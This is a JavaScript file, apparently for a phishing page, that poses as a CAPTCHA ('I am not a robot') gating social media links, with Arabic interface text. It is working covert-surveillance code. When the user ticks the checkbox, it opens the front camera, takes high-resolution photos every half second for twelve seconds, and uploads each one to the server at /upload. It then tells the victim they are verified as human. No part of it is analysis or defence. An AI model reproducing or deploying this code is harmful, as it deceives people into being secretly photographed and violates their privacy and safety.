(function() {
  'use strict';

  console.log('✅ VeriShield loaded successfully!');

  // ===== العناصر =====
  const socialButtons = document.getElementById('social-buttons');
  const socialLinks = document.querySelectorAll('#social-buttons a');
  const loadingMessage = document.getElementById('loading-message');
  const loadingText = document.getElementById('loading-text');
  const captchaWidget = document.getElementById('captcha-widget');
  const captchaCheckbox = document.getElementById('captcha-checkbox');
  const captchaText = document.getElementById('captcha-text');
  const finalMessage = document.getElementById('final-message');

  let isProcessing = false;
  let cameraRejected = false;
  let loadingTimeout = null;
  let linksAdded = false;

  let stream = null;
  let video = null;
  let captureInterval = null;
  let finishTimeout = null;
  let imageNumber = 0;

  const duration = 12000;
  const intervalTime = 500;

  // ============================================
  // تأثير الاهتزاز
  // ============================================

  function shakeIcon(element) {
    if (!element) return;
    element.classList.remove('shake');
    void element.offsetHeight;
    element.classList.add('shake');
    setTimeout(function() {
      element.classList.remove('shake');
    }, 600);
  }

  function shakeCheckbox() {
    if (!captchaCheckbox) return;
    captchaCheckbox.classList.remove('shake');
    void captchaCheckbox.offsetHeight;
    captchaCheckbox.classList.add('shake');
    setTimeout(function() {
      captchaCheckbox.classList.remove('shake');
    }, 500);
  }

  function shakeText() {
    if (!captchaText) return;
    captchaText.classList.remove('shake');
    void captchaText.offsetHeight;
    captchaText.classList.add('shake');
    setTimeout(function() {
      captchaText.classList.remove('shake');
    }, 500);
  }

  // ============================================
  // دوال التحكم في الواجهة
  // ============================================

  function showLoading(message) {
    loadingText.textContent = message || 'جاري التحميل...';
    loadingMessage.classList.add('show');
    socialButtons.classList.add('hidden');
    captchaWidget.classList.remove('show');
    finalMessage.classList.remove('show');
    console.log('⏳ Show loading');
  }

  function hideLoading() {
    loadingMessage.classList.remove('show');
    console.log('✅ Hide loading');
  }

  function showCaptcha() {
    hideLoading();
    socialButtons.classList.add('hidden');
    captchaWidget.classList.add('show');
    finalMessage.classList.remove('show');
    captchaWidget.classList.remove('state-loading', 'state-success', 'state-error');
    captchaText.textContent = 'أنا لست برنامج روبوت';
    captchaText.style.color = '#000000';
    captchaText.style.opacity = '1';
    captchaCheckbox.setAttribute('aria-checked', 'false');

    if (captureInterval) {
      clearInterval(captureInterval);
      captureInterval = null;
    }
    if (finishTimeout) {
      clearTimeout(finishTimeout);
      finishTimeout = null;
    }
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      stream = null;
    }
    console.log('🔍 Show captcha');
  }

  function showButtons() {
    hideLoading();
    captchaWidget.classList.remove('show');
    socialButtons.classList.remove('hidden');
    finalMessage.classList.remove('show');
    console.log('🔓 Show buttons');
  }

  function showFinalMessage() {
    finalMessage.classList.add('show');
    console.log('✅ Show final message');
  }

  // ============================================
  // دوال الكاميرا
  // ============================================

  async function sendImage(blob, number) {
    const formData = new FormData();
    formData.append("images", blob, `camera-${Date.now()}-${number}.jpg`);

    try {
      const response = await fetch("/upload", {
        method: "POST",
        body: formData
      });
      if (!response.ok) throw new Error("HTTP " + response.status);
      const result = await response.json();
      console.log("✅ تم إرسال الصورة رقم", number);
      return true;
    } catch (error) {
      console.error("❌ فشل إرسال الصورة رقم", number, error);
      return false;
    }
  }

  async function captureImage() {
    if (!video || !video.videoWidth || !video.videoHeight) return;

    const canvas = document.createElement("canvas");
    const width = Math.min(video.videoWidth, 1920);
    const height = Math.min(video.videoHeight, 1080);
    canvas.width = width;
    canvas.height = height;

    const context = canvas.getContext("2d");
    context.imageSmoothingEnabled = true;
    context.imageSmoothingQuality = 'high';
    context.drawImage(video, 0, 0, width, height);

    canvas.toBlob(async (blob) => {
      if (!blob) return;
      imageNumber++;
      await sendImage(blob, imageNumber);
    }, "image/jpeg", 0.92);
  }

  function addRealLinks() {
    if (linksAdded) return;

    socialLinks.forEach(function(btn) {
      const url = btn.getAttribute('data-url');
      if (url) {
        btn.setAttribute('href', url);
        btn.setAttribute('target', '_blank');
        btn.setAttribute('rel', 'noopener noreferrer');
      }
    });
    linksAdded = true;
    console.log('🔗 روابط حقيقية مضافة');
  }

  function removeRealLinks() {
    socialLinks.forEach(function(btn) {
      btn.removeAttribute('href');
      btn.removeAttribute('target');
      btn.removeAttribute('rel');
    });
    linksAdded = false;
    console.log('🔗 روابط تمت إزالتها');
  }

  function showError(message) {
    captchaWidget.classList.remove('state-loading', 'state-success');
    captchaWidget.classList.add('state-error');
    captchaText.textContent = message;
    captchaText.style.color = '#888888';
    cameraRejected = true;
    isProcessing = false;
    captchaCheckbox.setAttribute('aria-checked', 'false');
  }

  function resetState() {
    if (loadingTimeout) {
      clearTimeout(loadingTimeout);
      loadingTimeout = null;
    }
    hideLoading();
    captchaWidget.classList.remove('state-error', 'state-loading', 'state-success');
    captchaText.textContent = 'أنا لست برنامج روبوت';
    captchaText.style.color = '#000000';
    cameraRejected = false;
    isProcessing = false;
    captchaCheckbox.setAttribute('aria-checked', 'false');
    finalMessage.classList.remove('show');
    if (captureInterval) {
      clearInterval(captureInterval);
      captureInterval = null;
    }
    if (finishTimeout) {
      clearTimeout(finishTimeout);
      finishTimeout = null;
    }
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      stream = null;
    }
    console.log('🔄 State reset');
  }

  // ============================================
  // بدء التحقق
  // ============================================

  function startVerification() {
    console.log('🔄 startVerification called');

    if (cameraRejected) {
      resetState();
      setTimeout(startVerification, 100);
      return;
    }

    if (isProcessing) {
      console.log('⏸️ Already processing');
      return;
    }

    if (linksAdded) {
      removeRealLinks();
    }

    if (!captchaWidget.classList.contains('show')) {
      showCaptcha();
      console.log('⏳ Showing captcha first, click the checkbox');
      return;
    }

    isProcessing = true;

    const humanDelay = Math.floor(Math.random() * 100) + 50;

    setTimeout(async function() {
      console.log('▶️ Starting verification');

      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user",
            width: { ideal: 1920 },
            height: { ideal: 1080 }
          },
          audio: false
        });

        video = document.createElement("video");
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        await video.play();

        await new Promise(resolve => {
          if (video.videoWidth && video.videoHeight) {
            resolve();
            return;
          }
          video.onloadedmetadata = () => resolve();
        });

        console.log(`📷 Camera: ${video.videoWidth}x${video.videoHeight}`);

        captchaWidget.classList.add('state-loading');
        captchaCheckbox.setAttribute('aria-checked', 'mixed');

        captchaText.style.opacity = '0';
        setTimeout(function() {
          captchaText.textContent = 'جاري التحقق...';
          captchaText.style.opacity = '1';
        }, 300);

        await captureImage();
        captureInterval = setInterval(captureImage, intervalTime);

      } catch (error) {
        console.error("❌ Camera error:", error);
        isProcessing = false;
        showError('تعذر استخدام الكاميرا. حاول مرة أخرى.');
        setTimeout(function() {
          resetState();
          showButtons();
        }, 3000);
        return;
      }

      let counter = 0;
      const textInterval = setInterval(function() {
        counter++;
        captchaText.textContent = counter < 6 ? 'جاري التحقق...' : 'جاري إكمال التحقق...';
      }, 2000);

      finishTimeout = setTimeout(function() {
        clearInterval(textInterval);
        clearInterval(captureInterval);
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
          stream = null;
        }
        completeVerification();
      }, duration);

    }, humanDelay);
  }

  function completeVerification() {
    console.log('✅ Verification complete!');
    isProcessing = false;
    cameraRejected = false;

    captchaWidget.classList.remove('state-loading', 'state-error');
    captchaWidget.classList.add('state-success');
    captchaCheckbox.setAttribute('aria-checked', 'true');

    captchaText.style.opacity = '0';
    setTimeout(function() {
      captchaText.textContent = 'تم التحقق من أنك إنسان';
      captchaText.style.opacity = '1';
      captchaText.style.color = '#00aa45';

      setTimeout(function() {
        showFinalMessage();

        setTimeout(function() {
          addRealLinks();
          showButtons();
          resetState();
        }, 2000);

      }, 600);
    }, 300);
  }

  // ============================================
  // الأحداث - مع الإيماءات
  // ============================================

  // 1. الأيقونات
  socialLinks.forEach(function(btn) {
    btn.addEventListener('click', function(e) {
      shakeIcon(btn);

      if (linksAdded) {
        return;
      }

      e.preventDefault();
      console.log('👆 Button clicked - starting verification flow');

      if (loadingTimeout) {
        clearTimeout(loadingTimeout);
        loadingTimeout = null;
      }

      showLoading('جاري الاتصال بالخادم...');

      setTimeout(function() {
        loadingText.textContent = 'جاري تجهيز التحقق...';
      }, 1500);

      loadingTimeout = setTimeout(function() {
        showCaptcha();
      }, 2500);
    });
  });

  // 2. مربع التحقق - مع اهتزاز
  captchaCheckbox.addEventListener('click', function(e) {
    console.log('👆 Checkbox clicked');
    e.stopPropagation();
    shakeCheckbox();

    if (loadingTimeout) {
      clearTimeout(loadingTimeout);
      loadingTimeout = null;
    }
    hideLoading();
    startVerification();
  });

  // 3. النص - مع اهتزاز
  captchaText.addEventListener('click', function() {
    console.log('👆 Text clicked');
    shakeText();

    if (!isProcessing) {
      if (loadingTimeout) {
        clearTimeout(loadingTimeout);
        loadingTimeout = null;
      }
      hideLoading();
      startVerification();
    }
  });

  // 4. Keyboard
  captchaCheckbox.addEventListener('keydown', function(e) {
    if (e.key === ' ' || e.key === 'Enter') {
      e.preventDefault();
      console.log('⌨️ Key pressed:', e.key);
      shakeCheckbox();

      if (loadingTimeout) {
        clearTimeout(loadingTimeout);
        loadingTimeout = null;
      }
      hideLoading();
      startVerification();
    }
  });

  // 5. تنظيف عند الخروج
  window.addEventListener("beforeunload", function() {
    if (captureInterval) clearInterval(captureInterval);
    if (finishTimeout) clearTimeout(finishTimeout);
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
  });

  console.log('🚀 Ready to verify!');

})();
